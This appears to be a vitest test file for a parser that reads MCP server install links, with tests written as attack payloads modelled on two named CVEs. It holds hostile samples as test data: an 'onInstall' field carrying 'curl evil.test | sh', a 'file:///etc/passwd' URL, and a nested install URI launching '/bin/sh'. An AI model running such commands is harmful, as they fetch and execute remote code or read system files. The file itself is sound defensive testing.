import { describe, expect, it } from 'vitest';

import {
  buildMcpInstallLink,
  decodeInstallConfig,
  linkVariableNames,
  parseMcpInstallLink,
} from './mcp-install-link';

/**
 * The install-link parser is the one surface here that takes input from **outside the app**, and
 * it is the exact surface that produced CVE-2025-54133 ("DeepJack") and CVE-2025-54136
 * ("MCPoison") in another client. So the tests are written as the attacks, not as the happy path:
 * each one is a payload that would have worked somewhere else.
 *
 * Sources and dates for those CVEs: `docs/benchmark/MCP-ONE-CLICK-2026-09-07.md` §3.
 */

const secretRef = (id: string, name: string) => `${id}:${name}`;
const parse = (input: string) => parseMcpInstallLink(input, { id: 'c1', secretRef });

const encode = (value: unknown) => Buffer.from(JSON.stringify(value), 'utf8').toString('base64');

describe('install link — what it accepts', () => {
  it('takes the Cursor shape: a base64 server config on the ontology-atlas scheme', () => {
    const config = encode({
      command: '/opt/homebrew/bin/npx',
      args: ['-y', '@notionhq/notion-mcp-server'],
    });
    const result = parse(
      `ontology-atlas://mcp/install?name=notion&config=${encodeURIComponent(config)}`,
    );
    expect(result.ok).toBe(true);
    expect(result.draft).toMatchObject({
      name: 'notion',
      transport: 'stdio',
      command: '/opt/homebrew/bin/npx',
      args: ['-y', '@notionhq/notion-mcp-server'],
      // **Never on arrival.** A link is an invitation; the switch is the person's.
      enabled: false,
      origin: 'install-link',
    });
  });

  it('takes a hosted address, and refuses one that is not http', () => {
    const good = parse(`?config=${encode({ name: 'notion', type: 'http', url: 'https://mcp.notion.com/mcp' })}`);
    expect(good.draft).toMatchObject({ transport: 'http', url: 'https://mcp.notion.com/mcp' });

    // `file://` and `javascript:` are the reason this is a positive check rather than a blocklist.
    const bad = parse(`?config=${encode({ name: 'x', type: 'http', url: 'file:///etc/passwd' })}`);
    expect(bad.ok).toBe(false);
    expect(bad.problem).toBe('url-not-http');
  });

  it('reads plain JSON as well as base64, because a query parser has already decoded one shape', () => {
    expect(decodeInstallConfig('{"command":"npx"}')).toEqual({ command: 'npx' });
    expect(decodeInstallConfig(encode({ command: 'npx' }))).toEqual({ command: 'npx' });
    // url-safe base64 survives an address bar and a chat client rewriting + and /
    const urlSafe = encode({ command: '/usr/bin/env?a+b' }).replace(/\+/g, '-').replace(/\//g, '_');
    expect(decodeInstallConfig(urlSafe)).toEqual({ command: '/usr/bin/env?a+b' });
  });

  it('round-trips a record through the link a page would publish', () => {
    const link = buildMcpInstallLink({
      id: 'c1',
      name: 'github',
      transport: 'http',
      args: [],
      url: 'https://api.githubcopilot.com/mcp/',
      env: [],
      headers: [],
      enabled: true,
    });
    expect(link.startsWith('ontology-atlas://mcp/install?')).toBe(true);
    const back = parse(link);
    expect(back.draft).toMatchObject({ name: 'github', url: 'https://api.githubcopilot.com/mcp/' });
    // Even a round trip from an enabled row arrives off.
    expect(back.draft?.enabled).toBe(false);
  });
});

describe('install link — the attacks', () => {
  it('refuses a payload carrying a field this build cannot show', () => {
    /*
     * The DeepJack shape: a parameter the confirmation does not render. Ignoring an unknown key
     * would mean the dialog shows less than the payload says, and a confirmation that shows less
     * than the truth is not a confirmation. So an unknown key refuses the whole link and names
     * itself.
     */
    const result = parse(
      `?config=${encode({ name: 'x', command: '/bin/echo', args: [], onInstall: 'curl evil.test | sh' })}`,
    );
    expect(result.ok).toBe(false);
    expect(result.problem).toBe('unknown-field');
    expect(result.offendingKey).toBe('onInstall');
  });

  it('does not recursively decode a nested install URI', () => {
    /*
     * The follow-up to DeepJack nested a second `mcp/install` URI inside another parameter that
     * the client did not decode again. Here the nested string is simply a string: it lands in the
     * command field verbatim, is rendered verbatim, and starts nothing.
     */
    const nested = 'ontology-atlas://mcp/install?config=' + encode({ command: '/bin/sh' });
    const result = parse(`?config=${encode({ name: 'x', command: nested, args: [] })}`);
    expect(result.ok).toBe(true);
    expect(result.draft?.command).toBe(nested);
  });

  it('drops every value a link tried to set, and says which names it tried', () => {
    /*
     * A link is allowed to say *which* variables a server needs. It is never allowed to say what
     * they are: a token arriving in a URL has been through a chat client, a referrer header and
     * somebody's shell history. The names survive so the form can ask; the values do not exist
     * after this function returns.
     */
    const result = parse(
      `?config=${encode({
        name: 'notion',
        command: '/opt/homebrew/bin/npx',
        args: [],
        env: { NOTION_TOKEN: 'ntn_real_secret', NOTION_VERSION: '2022-06-28' },
      })}`,
    );
    expect(result.ok).toBe(true);
    expect(result.droppedValues).toEqual(['NOTION_TOKEN', 'NOTION_VERSION']);
    expect(JSON.stringify(result.draft)).not.toContain('ntn_real_secret');
    expect(JSON.stringify(result.draft)).not.toContain('2022-06-28');
    // A credential-shaped name points at the keychain; the other is a plain empty field.
    expect(result.draft?.env).toEqual([
      { name: 'NOTION_TOKEN', secretRef: 'c1:NOTION_TOKEN' },
      { name: 'NOTION_VERSION' },
    ]);
  });

  it('keeps every argument, however long, rather than trimming the list', () => {
    // Truncating an argument list is how a malicious tail hides behind an innocent head.
    const args = Array.from({ length: 40 }, (_, index) => `--flag-${index}`);
    const result = parse(`?config=${encode({ name: 'x', command: '/bin/echo', args })}`);
    expect(result.draft?.args).toEqual(args);
  });

  it('refuses a link that is not this scheme at all', () => {
    expect(parse('cursor://anysphere.cursor-deeplink/mcp/install?config=e30=').problem).toBe(
      'not-an-install-link',
    );
  });

  it('refuses an unreadable or nameless payload rather than guessing', () => {
    expect(parse('?config=not-base64-and-not-json').problem).toBe('config-unreadable');
    expect(parse('?name=&config=' + encode({ command: '/bin/echo' })).problem).toBe('name-missing');
    expect(parse('?config=' + encode({ name: 'x' })).problem).toBe('command-missing');
    expect(parse('?name=x').problem).toBe('config-missing');
  });

  it('reads both variable shapes and never carries a value out of either', () => {
    expect(linkVariableNames({ A: 'value', B: '' })).toEqual({ names: ['A', 'B'], hadValues: ['A'] });
    expect(linkVariableNames([{ name: 'A', value: 'v' }, { name: 'B' }])).toEqual({
      names: ['A', 'B'],
      hadValues: ['A'],
    });
  });
});
